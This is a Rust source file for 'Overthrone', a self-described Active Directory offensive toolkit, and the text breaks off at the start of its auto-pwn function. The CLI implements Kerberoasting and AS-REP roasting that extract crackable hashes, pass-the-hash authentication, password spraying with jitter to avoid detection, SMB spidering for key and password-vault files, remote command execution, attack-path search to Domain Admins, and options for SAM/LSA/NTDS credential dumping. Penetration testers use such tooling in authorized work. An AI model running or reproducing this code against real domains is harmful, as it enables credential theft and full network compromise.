//! Overthrone CLI — Active Directory Offensive Toolkit

mod auth;
mod autopwn;
mod banner;
mod commands;

use auth::{AuthMethod, Credentials};
use autopwn::ExecMethod;
use clap::{Parser, Subcommand};
use colored::Colorize;
use overthrone_core::graph::AttackGraph;
use overthrone_core::proto::{kerberos, ldap::LdapSession, smb::SmbSession};
use overthrone_pilot::goals::EngagementState;
use overthrone_pilot::planner::{NoiseLevel, PlanStep, PlannedAction};
use overthrone_pilot::runner::Stage;
use overthrone_reaper::runner::ReaperConfig;
use std::path::Path;
use tracing_subscriber::{EnvFilter, fmt};

// ═══════════════════════════════════════════════════════
// CLI Definition
// ═══════════════════════════════════════════════════════

#[derive(Parser)]
#[command(
    name = "overthrone",
    version,
    about = "Active Directory Offensive Toolkit",
    long_about = "Overthrone — AD enumeration, attack path analysis, and exploitation framework.\nBuilt in Rust for speed and stealth."
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,

    #[arg(short = 'H', long, global = true, env = "OT_DC_HOST")]
    dc_host: Option<String>,

    #[arg(short, long, global = true, env = "OT_DOMAIN")]
    domain: Option<String>,

    #[arg(short, long, global = true, env = "OT_USERNAME")]
    username: Option<String>,

    #[arg(
        short,
        long,
        global = true,
        env = "OT_PASSWORD",
        hide_env_values = true
    )]
    password: Option<String>,

    #[arg(long, global = true, env = "OT_NTHASH", hide_env_values = true)]
    nt_hash: Option<String>,

    #[arg(long, global = true, env = "KRB5CCNAME")]
    ticket: Option<String>,

    #[arg(
        short = 'A',
        long,
        global = true,
        value_enum,
        default_value = "password"
    )]
    auth_method: AuthMethod,

    #[arg(short, long, global = true, action = clap::ArgAction::Count)]
    verbose: u8,

    #[arg(short, long, global = true, value_enum, default_value = "text")]
    output: OutputFormat,

    #[arg(short = 'O', long, global = true)]
    outfile: Option<String>,
}

#[derive(Clone, clap::ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

#[derive(Subcommand)]
enum Commands {
    /// Interactive wizard mode for AD engagements
    Wizard {
        #[command(flatten)]
        args: commands::wizard::WizardArgs,
    },
    /// Full AD enumeration via reaper modules
    Reaper {
        #[arg(long, env = "OT_DC_IP")]
        dc_ip: Option<String>,
        #[arg(long, short, value_delimiter = ',')]
        modules: Vec<String>,
        #[arg(long, default_value = "500")]
        page_size: u32,
    },
    /// Enumerate specific AD object types
    Enum {
        #[arg(value_enum)]
        target: EnumTarget,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },
    Kerberos {
        #[command(subcommand)]
        action: KerberosAction,
    },
    Smb {
        #[command(subcommand)]
        action: SmbAction,
    },
    Exec {
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        command: String,
    },
    Graph {
        #[command(subcommand)]
        action: GraphAction,
    },
    Spray {
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        userlist: String,
        #[arg(long, default_value = "1")]
        delay: u64,
        #[arg(long, default_value = "0")]
        jitter: u64,
    },
    #[command(name = "auto-pwn")]
    AutoPwn {
        #[arg(short, long, default_value = "Domain Admins")]
        target: String,
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(long, default_value = "false")]
        stealth: bool,
        #[arg(long, default_value = "false")]
        dry_run: bool,
    },
    Dump {
        #[arg(short, long)]
        target: String,
        #[arg(value_enum)]
        source: DumpSource,
    },
}

#[derive(Clone, clap::ValueEnum)]
enum EnumTarget {
    Users,
    Computers,
    Groups,
    Trusts,
    Spns,
    Asrep,
    Delegations,
    Gpos,
    All,
}

#[derive(Subcommand)]
enum KerberosAction {
    Roast {
        #[arg(long)]
        spn: Option<String>,
    },
    AsrepRoast,
    GetTgt,
    GetTgs {
        #[arg(long)]
        spn: String,
    },
}

#[derive(Subcommand)]
enum SmbAction {
    Shares {
        #[arg(short, long)]
        target: String,
    },
    Admin {
        #[arg(short, long)]
        targets: String,
    },
    Spider {
        #[arg(short, long)]
        target: String,
        #[arg(long, default_value = ".kdbx,.key,.pem,.config,.ps1,.rdp")]
        extensions: String,
    },
    Get {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        path: String,
    },
    Put {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        local: String,
        #[arg(short, long)]
        remote: String,
    },
}

#[derive(Subcommand)]
enum GraphAction {
    Build,
    Path {
        #[arg(short, long)]
        from: String,
        #[arg(short, long)]
        to: String,
    },
    PathToDa {
        #[arg(short, long)]
        from: String,
    },
    Stats,
    Export {
        #[arg(short, long, default_value = "graph.json")]
        output: String,
    },
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum DumpSource {
    Sam,
    Lsa,
    Ntds,
    Dcc2,
}

// ═══════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    let filter = match cli.verbose {
        0 => "warn",
        1 => "info",
        2 => "debug",
        _ => "trace",
    };
    fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter)),
        )
        .with_target(false)
        .compact()
        .init();

    banner::print_banner();

    let exit_code = match &cli.command {
        Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
            Ok(()) => 0,
            Err(e) => {
                banner::print_fail(&format!("Wizard error: {}", e));
                1
            }
        },
        Commands::Reaper {
            dc_ip,
            modules,
            page_size,
        } => cmd_reaper(&cli, dc_ip.clone(), modules.clone(), *page_size).await,
        Commands::Enum {
            target,
            filter,
            include_disabled,
        } => cmd_enum(&cli, target.clone(), filter.clone(), *include_disabled).await,
        Commands::Kerberos { action } => cmd_kerberos(&cli, action).await,
        Commands::Smb { action } => cmd_smb(&cli, action).await,
        Commands::Exec {
            method,
            target,
            command,
        } => cmd_exec(&cli, method.clone(), target, command).await,
        Commands::Graph { action } => cmd_graph(&cli, action).await,
        Commands::Spray {
            password,
            userlist,
            delay,
            jitter,
        } => cmd_spray(&cli, password, userlist, *delay, *jitter).await,
        Commands::AutoPwn {
            target,
            method,
            stealth,
            dry_run,
        } => cmd_autopwn(&cli, target, method.clone(), *stealth, *dry_run).await,
        Commands::Dump { target, source } => cmd_dump(&cli, target, source.clone()).await,
    };

    std::process::exit(exit_code);
}

// ═══════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════

fn require_creds(cli: &Cli) -> std::result::Result<Credentials, i32> {
    let domain = cli.domain.as_deref().unwrap_or_else(|| {
        banner::print_fail("--domain is required");
        std::process::exit(1)
    });
    let username = cli.username.as_deref().unwrap_or_else(|| {
        banner::print_fail("--username is required");
        std::process::exit(1)
    });
    Credentials::from_args(
        domain,
        username,
        cli.password.as_deref(),
        cli.nt_hash.as_deref(),
        cli.ticket.as_deref(),
        Some(cli.auth_method.clone()),
    )
    .map_err(|e| {
        banner::print_fail(&format!("Auth error: {}", e));
        1
    })
}

fn require_dc(cli: &Cli) -> std::result::Result<String, i32> {
    cli.dc_host.clone().ok_or_else(|| {
        banner::print_fail("--dc-host is required");
        1
    })
}

fn make_reaper_config(
    cli: &Cli,
    creds: &Credentials,
    dc: String,
    modules: Vec<String>,
    page_size: u32,
) -> std::result::Result<ReaperConfig, i32> {
    let domain = cli.domain.clone().unwrap_or_else(|| {
        banner::print_fail("--domain is required");
        std::process::exit(1)
    });
    let base_dn = ReaperConfig::base_dn_from_domain(&domain);
    Ok(ReaperConfig {
        dc_ip: dc,
        domain,
        base_dn,
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules,
        page_size,
    })
}

// ═══════════════════════════════════════════════════════
// cmd_reaper
// ═══════════════════════════════════════════════════════

async fn cmd_reaper(cli: &Cli, dc_ip: Option<String>, modules: Vec<String>, page_size: u32) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match dc_ip.or_else(|| cli.dc_host.clone()) {
        Some(d) => d,
        None => {
            banner::print_fail("--dc-ip or --dc-host is required");
            return 1;
        }
    };
    let config = match make_reaper_config(cli, &creds, dc, modules, page_size) {
        Ok(c) => c,
        Err(e) => return e,
    };
    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => 0,
        Err(e) => {
            banner::print_fail(&format!("Reaper error: {}", e));
            1
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_enum
// ═══════════════════════════════════════════════════════

async fn cmd_enum(
    cli: &Cli,
    _target: EnumTarget,
    _filter: Option<String>,
    _include_disabled: bool,
) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let config = match make_reaper_config(cli, &creds, dc, vec![], 500) {
        Ok(c) => c,
        Err(e) => return e,
    };
    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => 0,
        Err(e) => {
            banner::print_fail(&format!("Enum error: {}", e));
            1
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_kerberos
// ═══════════════════════════════════════════════════════

async fn cmd_kerberos(cli: &Cli, action: &KerberosAction) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        KerberosAction::Roast { spn: spn_filter } => {
            banner::print_module_banner("KERBEROAST");
            let config = match make_reaper_config(cli, &creds, dc, vec!["spns".to_string()], 500) {
                Ok(c) => c,
                Err(e) => return e,
            };
            match overthrone_reaper::runner::run_reaper(&config).await {
                Ok(r) => {
                    for account in &r.spn_accounts {
                        for spn in &account.service_principal_names {
                            if spn_filter.as_deref().map_or(true, |f| spn.contains(f)) {
                                println!(
                                    "  {} {} ({})",
                                    "SPN".cyan(),
                                    spn,
                                    account.sam_account_name
                                );
                            }
                        }
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("{e}"));
                    1
                }
            }
        }
        KerberosAction::AsrepRoast => {
            banner::print_module_banner("AS-REP ROAST");
            // Step 1: Enumerate users with DONT_REQ_PREAUTH via reaper
            let config =
                match make_reaper_config(cli, &creds, dc.clone(), vec!["users".to_string()], 500) {
                    Ok(c) => c,
                    Err(e) => return e,
                };
            let reaper_result = match overthrone_reaper::runner::run_reaper(&config).await {
                Ok(r) => r,
                Err(e) => {
                    banner::print_fail(&format!("Enumeration failed: {e}"));
                    return 1;
                }
            };
            // Filter AS-REP roastable users
            let asrep_users: Vec<_> = reaper_result
                .users
                .iter()
                .filter(|u| u.dont_require_preauth && u.enabled)
                .collect();
            if asrep_users.is_empty() {
                banner::print_warn("No AS-REP roastable users found");
                return 0;
            }
            println!(
                "  {} {} AS-REP roastable users found",
                "▸".bright_black(),
                asrep_users.len().to_string().cyan()
            );
            let domain = creds.domain.clone();
            let mut hash_count = 0;
            for user in &asrep_users {
                match kerberos::asrep_roast(&dc, &domain, &user.sam_account_name).await {
                    Ok(hash) => {
                        println!(
                            "  {} {}: {}",
                            "✓".green(),
                            user.sam_account_name.bold(),
                            hash
                        );
                        hash_count += 1;
                    }
                    Err(e) => {
                        println!("  {} {}: {}", "✗".red(), user.sam_account_name, e);
                    }
                }
            }
            println!(
                "\n  {} {}/{} hashes extracted",
                "▸".bright_black(),
                hash_count.to_string().green(),
                asrep_users.len()
            );
            0
        }
        KerberosAction::GetTgt => {
            banner::print_module_banner("GET TGT");
            let (secret, use_hash) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let domain = creds.domain.clone();
            let username = creds.username.clone();
            println!(
                "  {} Requesting TGT for {}@{}",
                "▸".bright_black(),
                username.cyan(),
                domain.cyan()
            );
            match kerberos::request_tgt(&dc, &domain, &username, &secret, use_hash).await {
                Ok(tgt) => {
                    let filename = format!("{}_tgt.kirbi", username);
                    // Serialize TGT ticket bytes using the Asn1Object trait
                    use kerberos_asn1::Asn1Object;
                    let ticket_bytes = tgt.ticket.build();
                    if let Err(e) = std::fs::write(&filename, &ticket_bytes) {
                        banner::print_fail(&format!("Failed to write ticket: {e}"));
                    } else {
                        banner::print_success(&format!(
                            "TGT saved to {} ({} bytes)",
                            filename,
                            ticket_bytes.len()
                        ));
                    }
                    println!(
                        "  {} Session key ({} bytes), etype: {}",
                        "▸".bright_black(),
                        tgt.session_key.len(),
                        tgt.session_key_etype
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("TGT request failed: {e}"));
                    1
                }
            }
        }
        KerberosAction::GetTgs { spn } => {
            banner::print_module_banner("GET TGS");
            let (secret, use_hash) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let domain = creds.domain.clone();
            let username = creds.username.clone();
            println!(
                "  {} Step 1: Requesting TGT for {}@{}",
                "▸".bright_black(),
                username.cyan(),
                domain.cyan()
            );
            let tgt = match kerberos::request_tgt(&dc, &domain, &username, &secret, use_hash).await
            {
                Ok(t) => t,
                Err(e) => {
                    banner::print_fail(&format!("TGT request failed: {e}"));
                    return 1;
                }
            };
            banner::print_success("TGT obtained");
            println!(
                "  {} Step 2: Requesting TGS for SPN: {}",
                "▸".bright_black(),
                spn.yellow()
            );
            match kerberos::kerberoast(&dc, &tgt, spn).await {
                Ok(hash) => {
                    println!(
                        "\n  {} Crackable hash (hashcat mode 13100):",
                        "▸".bright_black()
                    );
                    println!("  {}", hash);
                    let filename = format!("{}_tgs.hash", spn.replace('/', "_"));
                    if let Err(e) = std::fs::write(&filename, format!("{}", hash)) {
                        banner::print_fail(&format!("Failed to write hash: {e}"));
                    } else {
                        banner::print_success(&format!("Hash saved to {}", filename));
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("TGS request failed: {e}"));
                    1
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_smb
// ═══════════════════════════════════════════════════════

async fn cmd_smb(cli: &Cli, action: &SmbAction) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, _use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };
    match action {
        SmbAction::Shares { target } => {
            banner::print_module_banner("SMB SHARES");
            println!("  {} Connecting to {}", "▸".bright_black(), target.cyan());
            let session =
                match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                    Ok(s) => s,
                    Err(e) => {
                        banner::print_fail(&format!("SMB connect failed: {e}"));
                        return 1;
                    }
                };
            let default_shares = ["C$", "ADMIN$", "IPC$", "NETLOGON", "SYSVOL"];
            let results = session.check_share_access(&default_shares).await;
            println!(
                "\n  {:<15} {:<8} {:<8}",
                "Share".bold(),
                "Read".bold(),
                "Write".bold()
            );
            println!("  {}", "─".repeat(35));
            for r in &results {
                let read_icon = if r.readable {
                    "✓".green()
                } else {
                    "✗".red()
                };
                let write_icon = if r.writable {
                    "✓".green()
                } else {
                    "✗".red()
                };
                println!("  {:<15} {:<8} {:<8}", r.share_name, read_icon, write_icon);
            }
            0
        }
        SmbAction::Admin { targets } => {
            banner::print_module_banner("SMB ADMIN CHECK");
            let target_list: Vec<String> =
                targets.split(',').map(|s| s.trim().to_string()).collect();
            for target in &target_list {
                println!(
                    "  {} Checking admin on {}",
                    "▸".bright_black(),
                    target.cyan()
                );
                match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                    Ok(session) => {
                        let result = session.check_admin_access().await;
                        if result.has_admin {
                            let shares = result.accessible_shares.join(", ");
                            println!(
                                "  {} {} — {} ({})",
                                "✓".green().bold(),
                                target.bold(),
                                "ADMIN".green().bold(),
                                shares
                            );
                        } else {
                            println!("  {} {} — {}", "✗".red(), target, "not admin".dimmed());
                        }
                    }
                    Err(e) => {
                        println!("  {} {} — {}", "✗".red(), target, format!("{e}").dimmed());
                    }
                }
            }
            0
        }
        SmbAction::Spider { target, extensions } => {
            banner::print_module_banner("SMB SPIDER");
            let ext_list: Vec<&str> = extensions.split(',').map(|s| s.trim()).collect();
            println!(
                "  {} Spidering {} for {:?}",
                "▸".bright_black(),
                target.cyan(),
                ext_list
            );
            let session =
                match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                    Ok(s) => s,
                    Err(e) => {
                        banner::print_fail(&format!("SMB connect failed: {e}"));
                        return 1;
                    }
                };
            let shares = ["C$", "ADMIN$", "NETLOGON", "SYSVOL"];
            let mut total_found = 0usize;
            for share in &shares {
                if session.check_share_read(share).await {
                    match session.list_directory(share, "\\").await {
                        Ok(files) => {
                            for file in &files {
                                let fname = file.name.to_lowercase();
                                if ext_list
                                    .iter()
                                    .any(|ext| fname.ends_with(&ext.to_lowercase()))
                                {
                                    println!(
                                        "  {} \\\\{}\\{}\\{} ({} bytes)",
                                        "✓".green(),
                                        target,
                                        share,
                                        file.name,
                                        file.size
                                    );
                                    total_found += 1;
                                }
                            }
                        }
                        Err(_) => {} // skip inaccessible dirs
                    }
                }
            }
            println!(
                "\n  {} {} interesting files found",
                "▸".bright_black(),
                total_found.to_string().cyan()
            );
            0
        }
        SmbAction::Get { target, path } => {
            banner::print_module_banner("SMB GET");
            println!(
                "  {} Downloading {}:{}",
                "▸".bright_black(),
                target.cyan(),
                path.yellow()
            );
            let session =
                match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                    Ok(s) => s,
                    Err(e) => {
                        banner::print_fail(&format!("SMB connect failed: {e}"));
                        return 1;
                    }
                };
            // Parse share and path: e.g. "C$/Windows/System32/config/SAM" → share="C$", path="Windows/System32/config/SAM"
            let (share, remote_path) = match path.split_once('/') {
                Some((s, p)) => (s, p),
                None => (path.as_str(), ""),
            };
            let local_filename = Path::new(remote_path)
                .file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "download.bin".to_string());
            match session
                .download_file(share, remote_path, &local_filename)
                .await
            {
                Ok(bytes) => {
                    banner::print_success(&format!(
                        "Downloaded {} bytes → {}",
                        bytes, local_filename
                    ));
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Download failed: {e}"));
                    1
                }
            }
        }
        SmbAction::Put {
            target,
            local,
            remote,
        } => {
            banner::print_module_banner("SMB PUT");
            println!(
                "  {} Uploading {} → {}:{}",
                "▸".bright_black(),
                local.yellow(),
                target.cyan(),
                remote.yellow()
            );
            let session =
                match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                    Ok(s) => s,
                    Err(e) => {
                        banner::print_fail(&format!("SMB connect failed: {e}"));
                        return 1;
                    }
                };
            let (share, remote_path) = match remote.split_once('/') {
                Some((s, p)) => (s, p),
                None => (remote.as_str(), local.as_str()),
            };
            match session.upload_file(local, share, remote_path).await {
                Ok(bytes) => {
                    banner::print_success(&format!(
                        "Uploaded {} bytes → \\\\{}\\{}\\{}",
                        bytes, target, share, remote_path
                    ));
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Upload failed: {e}"));
                    1
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_exec
// ═══════════════════════════════════════════════════════

async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    banner::print_module_banner("EXEC");
    println!(
        "  {} Target: {}  Method: {:?}",
        "▸".bright_black(),
        target.cyan(),
        method
    );
    println!("  {} Command: {}", "▸".bright_black(), command.yellow());
    let ctx = match creds.to_exec_context(&dc, false, false) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };
    let mut state = EngagementState::new();
    let method_str = format!("{}", method);
    let step = PlanStep {
        id: "cli_exec_001".to_string(),
        description: format!("Remote exec on {} via {}", target, method_str),
        stage: Stage::Lateral,
        action: PlannedAction::ExecCommand {
            target: target.to_string(),
            command: command.to_string(),
            method: method_str,
        },
        priority: 50,
        noise: NoiseLevel::Medium,
        depends_on: vec![],
        executed: false,
        result: None,
        retries: 0,
        max_retries: 1,
    };
    let result = overthrone_pilot::executor::execute_step(&step, &ctx, &mut state).await;
    if result.success {
        println!("\n  {} Output:\n{}", "▸".bright_black(), result.output);
        0
    } else {
        banner::print_fail(&result.output);
        1
    }
}

// ═══════════════════════════════════════════════════════
// cmd_graph
// ═══════════════════════════════════════════════════════

async fn cmd_graph(cli: &Cli, action: &GraphAction) -> i32 {
    banner::print_module_banner("GRAPH");
    let graph_file = "overthrone_graph.json";

    match action {
        GraphAction::Build => {
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            println!(
                "  {} Building attack graph via LDAP enumeration...",
                "▸".bright_black()
            );
            let (secret, _use_hash) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let mut ldap =
                match LdapSession::connect(&dc, &creds.domain, &creds.username, &secret, false)
                    .await
                {
                    Ok(l) => l,
                    Err(e) => {
                        banner::print_fail(&format!("LDAP connect failed: {e}"));
                        return 1;
                    }
                };
            let enum_data = match ldap.full_enumeration().await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Enumeration failed: {e}"));
                    return 1;
                }
            };
            let _ = ldap.disconnect().await;
            let mut graph = AttackGraph::new();
            graph.ingest_enumeration(&enum_data);
            let stats = graph.stats();
            println!(
                "  {} Nodes: {}  Edges: {}",
                "✓".green(),
                stats.total_nodes.to_string().cyan(),
                stats.total_edges.to_string().cyan()
            );
            println!(
                "  {} Users: {}  Computers: {}  Groups: {}",
                "▸".bright_black(),
                stats.users.to_string().cyan(),
                stats.computers.to_string().cyan(),
                stats.groups.to_string().cyan()
            );
            // Save graph to file
            match graph.export_json() {
                Ok(json) => {
                    if let Err(e) = std::fs::write(graph_file, &json) {
                        banner::print_fail(&format!("Failed to save graph: {e}"));
                    } else {
                        banner::print_success(&format!(
                            "Graph saved to {} ({} bytes)",
                            graph_file,
                            json.len()
                        ));
                    }
                }
                Err(e) => banner::print_fail(&format!("Graph export failed: {e}")),
            }
            0
        }
        GraphAction::Stats => {
            // Load graph from file and show stats
            let json = match std::fs::read_to_string(graph_file) {
                Ok(j) => j,
                Err(_) => {
                    banner::print_fail(&format!(
                        "Graph file '{}' not found. Run 'graph build' first.",
                        graph_file
                    ));
                    return 1;
                }
            };
            let data: serde_json::Value = match serde_json::from_str(&json) {
                Ok(v) => v,
                Err(e) => {
                    banner::print_fail(&format!("Failed to parse graph: {e}"));
                    return 1;
                }
            };
            println!(
                "  {:<20} {}",
                "Nodes:".bold(),
                data["nodes"]
                    .as_array()
                    .map(|a| a.len())
                    .unwrap_or(0)
                    .to_string()
                    .cyan()
            );
            println!(
                "  {:<20} {}",
                "Edges:".bold(),
                data["edges"]
                    .as_array()
                    .map(|a| a.len())
                    .unwrap_or(0)
                    .to_string()
                    .cyan()
            );
            if let Some(nodes) = data["nodes"].as_array() {
                let users = nodes.iter().filter(|n| n["type"] == "User").count();
                let computers = nodes.iter().filter(|n| n["type"] == "Computer").count();
                let groups = nodes.iter().filter(|n| n["type"] == "Group").count();
                let domains = nodes.iter().filter(|n| n["type"] == "Domain").count();
                println!("  {:<20} {}", "Users:".bold(), users.to_string().cyan());
                println!(
                    "  {:<20} {}",
                    "Computers:".bold(),
                    computers.to_string().cyan()
                );
                println!("  {:<20} {}", "Groups:".bold(), groups.to_string().cyan());
                println!("  {:<20} {}", "Domains:".bold(), domains.to_string().cyan());
            }
            0
        }
        GraphAction::Export { output } => {
            // Copy graph file to specified output
            match std::fs::read_to_string(graph_file) {
                Ok(json) => {
                    if let Err(e) = std::fs::write(output, &json) {
                        banner::print_fail(&format!("Failed to export: {e}"));
                        return 1;
                    }
                    banner::print_success(&format!(
                        "Graph exported to {} ({} bytes)",
                        output,
                        json.len()
                    ));
                    0
                }
                Err(_) => {
                    banner::print_fail(&format!(
                        "Graph file '{}' not found. Run 'graph build' first.",
                        graph_file
                    ));
                    1
                }
            }
        }
        GraphAction::Path { from, to } => {
            // Rebuild graph from LDAP and find path
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            let (secret, _) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            println!(
                "  {} Finding path: {} → {}",
                "▸".bright_black(),
                from.cyan(),
                to.yellow()
            );
            let mut ldap =
                match LdapSession::connect(&dc, &creds.domain, &creds.username, &secret, false)
                    .await
                {
                    Ok(l) => l,
                    Err(e) => {
                        banner::print_fail(&format!("LDAP: {e}"));
                        return 1;
                    }
                };
            let enum_data = match ldap.full_enumeration().await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Enum: {e}"));
                    return 1;
                }
            };
            let _ = ldap.disconnect().await;
            let mut graph = AttackGraph::new();
            graph.ingest_enumeration(&enum_data);
            match graph.shortest_path(from, to) {
                Ok(path) => {
                    println!(
                        "\n  {} Attack path found (cost: {}, hops: {})",
                        "✓".green().bold(),
                        path.total_cost.to_string().yellow(),
                        path.hop_count
                    );
                    for (i, hop) in path.hops.iter().enumerate() {
                        println!(
                            "  [{}] {} --[{}]--> {}",
                            (i + 1).to_string().dimmed(),
                            hop.source.bold(),
                            format!("{}", hop.edge).cyan(),
                            hop.target.bold()
                        );
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("No path found: {e}"));
                    1
                }
            }
        }
        GraphAction::PathToDa { from } => {
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            let (secret, _) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            println!(
                "  {} Finding paths to Domain Admins from: {}",
                "▸".bright_black(),
                from.cyan()
            );
            let mut ldap =
                match LdapSession::connect(&dc, &creds.domain, &creds.username, &secret, false)
                    .await
                {
                    Ok(l) => l,
                    Err(e) => {
                        banner::print_fail(&format!("LDAP: {e}"));
                        return 1;
                    }
                };
            let enum_data = match ldap.full_enumeration().await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Enum: {e}"));
                    return 1;
                }
            };
            let _ = ldap.disconnect().await;
            let mut graph = AttackGraph::new();
            graph.ingest_enumeration(&enum_data);
            let domain = creds.domain.clone();
            let paths = graph.paths_to_da(from, &domain);
            if paths.is_empty() {
                banner::print_warn("No paths to Domain Admins found");
                return 1;
            }
            println!(
                "\n  {} {} attack paths to Domain Admins",
                "✓".green().bold(),
                paths.len().to_string().cyan()
            );
            for (pi, path) in paths.iter().enumerate() {
                println!(
                    "\n  {} Path {} → {} (cost: {}, hops: {})",
                    "▶".red().bold(),
                    (pi + 1).to_string().bold(),
                    path.target.bold(),
                    path.total_cost.to_string().yellow(),
                    path.hop_count
                );
                for (i, hop) in path.hops.iter().enumerate() {
                    println!(
                        "    [{}] {} --[{}]--> {}",
                        (i + 1).to_string().dimmed(),
                        hop.source.bold(),
                        format!("{}", hop.edge).cyan(),
                        hop.target.bold()
                    );
                }
            }
            0
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_spray
// ═══════════════════════════════════════════════════════

async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter: u64) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    banner::print_module_banner("PASSWORD SPRAY");

    // Read userlist from file
    let users: Vec<String> = match std::fs::read_to_string(userlist) {
        Ok(content) => content
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty() && !l.starts_with('#'))
            .collect(),
        Err(e) => {
            banner::print_fail(&format!("Failed to read userlist '{}': {e}", userlist));
            return 1;
        }
    };

    println!(
        "  {} Spraying {} users with password '{}'",
        "▸".bright_black(),
        users.len().to_string().cyan(),
        password
    );
    println!(
        "  {} DC: {}  Delay: {}s  Jitter: {}ms",
        "▸".bright_black(),
        dc.cyan(),
        delay,
        jitter
    );
    println!();

    let domain = creds.domain.clone();
    let mut valid_count = 0usize;
    let mut tested = 0usize;

    for user in &users {
        tested += 1;
        match kerberos::request_tgt(&dc, &domain, user, password, false).await {
            Ok(_) => {
                println!(
                    "  {} {}:{} — {}",
                    "✓".green().bold(),
                    user.bold(),
                    password,
                    "VALID".green().bold()
                );
                valid_count += 1;
            }
            Err(_) => {
                println!("  {} {}:{}", "✗".dimmed(), user, password);
            }
        }
        // Apply delay + jitter between attempts
        if tested < users.len() {
            let jitter_ms = if jitter > 0 {
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .subsec_nanos() as u64
                    % jitter
            } else {
                0
            };
            let total_delay = (delay * 1000) + jitter_ms;
            if total_delay > 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(total_delay)).await;
            }
        }
    }

    println!(
        "\n  {} Spray complete: {}/{} valid",
        "▸".bright_black(),
        valid_count.to_string().green(),
        users.len().to_string().cyan()
    );
    if valid_count > 0 { 0 } else { 1 }
}

// ═══════════════════════════════════════════════════════
// cmd_autopwn
// ═══════════════════════════════════════════════════════

async fn cmd_autopwn(
    cli: &Cli,
    target: &str,
    method: ExecMethod,
    stealth: bool,
    dry_run: bool,
) -> i32 {
